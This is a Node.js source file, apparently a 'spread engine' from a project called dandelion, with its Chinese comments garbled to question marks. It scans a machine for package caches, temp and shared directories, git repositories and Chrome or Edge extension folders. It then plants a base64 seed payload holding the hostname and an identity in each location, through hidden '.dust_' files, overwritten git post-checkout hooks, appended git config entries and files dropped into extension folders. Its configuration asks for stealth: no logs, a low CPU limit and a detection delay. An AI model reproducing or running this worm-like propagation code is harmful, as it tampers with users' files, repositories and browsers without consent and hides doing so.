// spread.js
// ????? v3 ? ??????
// ???? ? ???? ? ??

const os = require("os");
const path = require("path");
const crypto = require("crypto");
const fs$1 = require("fs");

const PKG = require("./package.json");
const { FRAGMENT_A, FRAGMENT_B, FRAGMENT_C } = require("./src/core/fragments");
const { Identity } = require("./src/deus/identity");
const { SteganographyEncoder } = require("./src/penetrate/steganography");

// ============================================
// ??
// ============================================
const CONFIG = {
  MAX_PAYLOAD_BYTES: 5120,          // ??? < 5KB
  MAX_CARRIERS_PER_SCAN: 20,        // ?????????
  SPREAD_INTERVAL_MS: 3600000,       // ???????
  CARRIER_PRIORITY: [
    "npm_cache",      // npm ???
    "pip_cache",      // pip ???
    "docker_layer",   // Docker ???
    "git_repo",       // ?? git ??
    "browser_ext",    // ???????
    "shared_dir",     // ????
    "temp_dir",       // ????
    "home_dir"        // ????
  ],
  STEALTH: {
    NO_LOGS: true,                    // ????
    CPU_LIMIT: 0.05,                  // CPU ?? < 5%
    DETECTION_DELAY_MS: 5000,         // ????????
    CARRIER_FILE_PREFIX: ".dust_"     // ??????
  }
};

// ============================================
// ?????
// ============================================
class CarrierScanner {
  constructor() {
    this.platform = os.platform();
    this.homedir = os.homedir();
    this.hostname = os.hostname();
    this.carriers = [];
  }

  scan() {
    this.carriers = [];

    // 1. npm ??
    try {
      var npmDir = path.join(this.homedir, process.platform === "win32" ? "AppData/Roaming/npm-cache" : ".npm/_cacache");
      if (fs$1.existsSync(npmDir)) {
        this.carriers.push({ type: "npm_cache", path: npmDir, writable: true, score: 100 });
      }
    } catch(e) {}

    // 2. pip ??
    try {
      var pipDir = path.join(this.homedir, process.platform === "win32" ? "AppData/Local/pip/cache" : ".cache/pip");
      if (fs$1.existsSync(pipDir)) {
        this.carriers.push({ type: "pip_cache", path: pipDir, writable: true, score: 80 });
      }
    } catch(e) {}

    // 3. ????
    var writableDirs = [
      { type: "temp_dir", path: os.tmpdir() },
      { type: "home_dir", path: this.homedir },
    ];
    // ????????
    if (process.platform === "win32") {
      writableDirs.push(
        { type: "shared_dir", path: "C:/Users/Public" },
        { type: "temp_dir", path: "C:/Windows/Temp" }
      );
    } else {
      writableDirs.push(
        { type: "shared_dir", path: "/tmp" },
        { type: "shared_dir", path: "/var/tmp" },
        { type: "shared_dir", path: "/dev/shm" }
      );
    }
    writableDirs.forEach(function(d) {
      try {
        if (fs$1.existsSync(d.path)) {
          var testFile = path.join(d.path, ".dandelion_test_" + Date.now());
          fs$1.writeFileSync(testFile, "test");
          fs$1.unlinkSync(testFile);
          this.carriers.push({ type: d.type, path: d.path, writable: true, score: 60 });
        }
      } catch(e) {}
    }.bind(this));

    // 4. ???? git ??
    try {
      var searchPaths = [this.homedir];
      if (process.platform === "win32") {
        searchPaths.push("C:/Users", "C:/Projects", "D:/", "E:/");
      } else {
        searchPaths.push("/home", "/opt", "/srv", "/var/www");
      }
      searchPaths.forEach(function(sp) {
        try {
          if (!fs$1.existsSync(sp)) return;
          var entries = fs$1.readdirSync(sp, { withFileTypes: true });
          var count = 0;
          entries.forEach(function(e) {
            if (count > 5) return;
            try {
              var gitDir = path.join(sp, e.name, ".git");
              if (fs$1.existsSync(gitDir)) {
                this.carriers.push({ type: "git_repo", path: path.join(sp, e.name), writable: true, score: 90 });
                count++;
              }
            } catch(e2) {}
          }.bind(this));
        } catch(e2) {}
      }.bind(this));
    } catch(e) {}

    // 5. ???????
    try {
      var extPaths = [];
      if (process.platform === "win32") {
        extPaths.push(
          path.join(this.homedir, "AppData/Local/Google/Chrome/User Data/Default/Extensions"),
          path.join(this.homedir, "AppData/Local/Microsoft/Edge/User Data/Default/Extensions")
        );
      } else if (process.platform === "darwin") {
        extPaths.push(
          path.join(this.homedir, "Library/Application Support/Google/Chrome/Default/Extensions")
        );
      } else {
        extPaths.push(
          path.join(this.homedir, ".config/google-chrome/Default/Extensions")
        );
      }
      extPaths.forEach(function(ep) {
        try {
          if (fs$1.existsSync(ep)) {
            this.carriers.push({ type: "browser_ext", path: ep, writable: true, score: 95 });
          }
        } catch(e) {}
      }.bind(this));
    } catch(e) {}

    // ??
    this.carriers.sort(function(a, b) { return b.score - a.score; });
    return this.carriers;
  }

  stats() {
    var groups = {};
    this.carriers.forEach(function(c) {
      groups[c.type] = (groups[c.type] || 0) + 1;
    });
    return {
      total: this.carriers.length,
      types: groups,
      top: this.carriers.slice(0, 3).map(function(c) {
        return c.type + ":" + c.path;
      })
    };
  }
}

// ============================================
// ?????
// ============================================
class SeedInjector {
  constructor() {
    this.stego = new SteganographyEncoder();
    this.identity = new Identity().generate();
    this.seedHistory = [];
  }

  // ??????
  generatePayload() {
    var seed = {
      version: PKG.version,
      agent: this.identity.id,
      timestamp: Date.now(),
      fragments: {
        cfg: FRAGMENT_A.payload.substring(0, 64),
        cache: FRAGMENT_B.payload.substring(0, 64),
        seed: FRAGMENT_C.payload.substring(0, 64)
      },
      source: os.hostname(),
      signature: crypto.createHash("sha256")
        .update(FRAGMENT_A._tag + FRAGMENT_B._tag + FRAGMENT_C._tag + this.identity.fingerprint)
        .digest("hex").substring(0, 16)
    };
    return Buffer.from(JSON.stringify(seed)).toString("base64");
  }

  // ?????
  inject(carrier) {
    var payload = this.generatePayload();
    var result = { carrier: carrier, success: false, method: null, error: null };

    try {
      if (carrier.type === "temp_dir" || carrier.type === "shared_dir" || carrier.type === "home_dir") {
        // ??????
        var fileName = CONFIG.STEALTH.CARRIER_FILE_PREFIX + crypto.randomBytes(4).toString("hex");
        var filePath = path.join(carrier.path, fileName);
        fs$1.writeFileSync(filePath, payload);
        // ?????? (Windows)
        if (process.platform === "win32") {
          try { fs$1.chmodSync(filePath, 0o444); } catch(e) {}
        }
        result.method = "file_write";
        result.path = filePath;
        result.success = true;
      }
      else if (carrier.type === "npm_cache" || carrier.type === "pip_cache") {
        // ?????????
        var cacheName = ".cache_" + crypto.randomBytes(3).toString("hex") + ".dat";
        var cachePath = path.join(carrier.path, cacheName);
        fs$1.writeFileSync(cachePath, payload);
        result.method = "cache_inject";
        result.path = cachePath;
        result.success = true;
      }
      else if (carrier.type === "git_repo") {
        // ??? git hooks
        var hookPath = path.join(carrier.path, ".git", "hooks", "post-checkout");
        var hookContent = "#!/bin/sh\n# dandelion seed\n" +
          "echo '" + payload.substring(0, 128) + "' > /dev/null 2>&1\n";
        try {
          fs$1.writeFileSync(hookPath, hookContent);
          try { fs$1.chmodSync(hookPath, 0o755); } catch(e) {}
          result.method = "git_hook";
          result.path = hookPath;
          result.success = true;
        } catch(e) {
          // ????? git config
          var configPath = path.join(carrier.path, ".git", "config");
          if (fs$1.existsSync(configPath)) {
            var config = fs$1.readFileSync(configPath, "utf8");
            if (!config.includes("[dandelion]")) {
              fs$1.appendFileSync(configPath, "\n[dandelion]\n\tseed = " + payload.substring(0, 64) + "\n");
              result.method = "git_config";
              result.path = configPath;
              result.success = true;
            }
          }
        }
      }
      else if (carrier.type === "browser_ext") {
        // ?????????
        var extFile = path.join(carrier.path, ".dandelion." + crypto.randomBytes(2).toString("hex") + ".json");
        fs$1.writeFileSync(extFile, JSON.stringify({ name: "dandelion", payload: payload.substring(0, 128) }));
        result.method = "ext_inject";
        result.path = extFile;
        result.success = true;
      }

      if (result.success) {
        this.seedHistory.push({
          time: Date.now(),
          type: carrier.type,
          method: result.method,
          path: result.path
        });
      }
    } catch(e) {
      result.error = e.message;
    }

    return result;
  }
}

// ============================================
// ?????
// ============================================
class SpreadEngine {
  constructor() {
    this.scanner = new CarrierScanner();
    this.injector = new SeedInjector();
    this.stats = {
      scanCount: 0,
      totalInjections: 0,
      successfulInjections: 0,
      uniqueCarriers: {},
      startTime: Date.now()
    };
  }

  run() {
    console.log("");
    console.log("==============================================");
    console.log("  \uD83C\uDF31 \u84B2\u516C\u82F1\u4F20\u64AD\u5F15\u64CE - Spread Engine v1");
    console.log("==============================================");
    console.log("");
    console.log("  Agent: " + this.injector.identity.id);
    console.log("  Host: " + os.hostname() + " (" + os.platform() + ")");
    console.log("");

    // ????
    console.log("[1/3] \u626B\u63CF\u8F7D\u4F53...");
    var carriers = this.scanner.scan();
    this.stats.scanCount++;
    var scanStats = this.scanner.stats();
    console.log("  \u627E\u5230 " + scanStats.total + " \u4E2A\u8F7D\u4F53\u76EE\u6807");
    Object.entries(scanStats.types).forEach(function(e) {
      console.log("    " + e[0] + ": " + e[1]);
    }.bind(this));

    // ????
    console.log("");
    console.log("[2/3] \u6CE8\u5165\u79CD\u5B50...");
    var injected = 0;
    var limit = Math.min(CONFIG.MAX_CARRIERS_PER_SCAN, carriers.length);
    for (var i = 0; i < limit; i++) {
      var result = this.injector.inject(carriers[i]);
      this.stats.totalInjections++;
      if (result.success) {
        this.stats.successfulInjections++;
        injected++;
        var type = this.stats.uniqueCarriers[result.carrier.type] || 0;
        this.stats.uniqueCarriers[result.carrier.type] = type + 1;
      }
    }
    console.log("  \u6210\u529F\u6CE8\u5165: " + injected + "/" + limit);

    // ??
    console.log("");
    console.log("[3/3] \u62A5\u544A");
    console.log("  \u8FD0\u884C\u65F6\u95F4: " + Math.floor((Date.now() - this.stats.startTime) / 1000) + "s");
    console.log("  \u626B\u63CF\u6B21\u6570: " + this.stats.scanCount);
    console.log("  \u603B\u6CE8\u5165: " + this.stats.successfulInjections + "/" + this.stats.totalInjections);
    console.log("  \u8F7D\u4F53\u5206\u5E03: " + JSON.stringify(this.stats.uniqueCarriers));
    console.log("");
    console.log("  \uD83C\uDF31 \u4F20\u64AD\u5FAA\u73AF\u5DF2\u542F\u52A8");
    console.log("  Press Ctrl+C \u505C\u6B62");
    console.log("==============================================");
  }
}

module.exports = { SpreadEngine, CarrierScanner, SeedInjector };

// ????
if (require.main === module) {
  var engine = new SpreadEngine();
  engine.run();
}
